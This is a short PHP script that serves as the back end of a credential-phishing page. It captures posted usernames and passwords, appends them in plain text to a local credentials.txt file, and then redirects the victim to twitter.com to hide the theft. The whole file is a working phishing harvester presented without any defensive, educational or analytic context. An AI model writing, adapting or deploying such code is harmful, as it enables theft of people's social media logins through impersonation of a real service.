<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Format the credentials
    $entry = "Username: $username | Password: $password" . PHP_EOL;

    // Save credentials to a text file
    file_put_contents("credentials.txt", $entry, FILE_APPEND | LOCK_EX);

    // Redirect to Twitter
    header("Location: https://twitter.com");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>
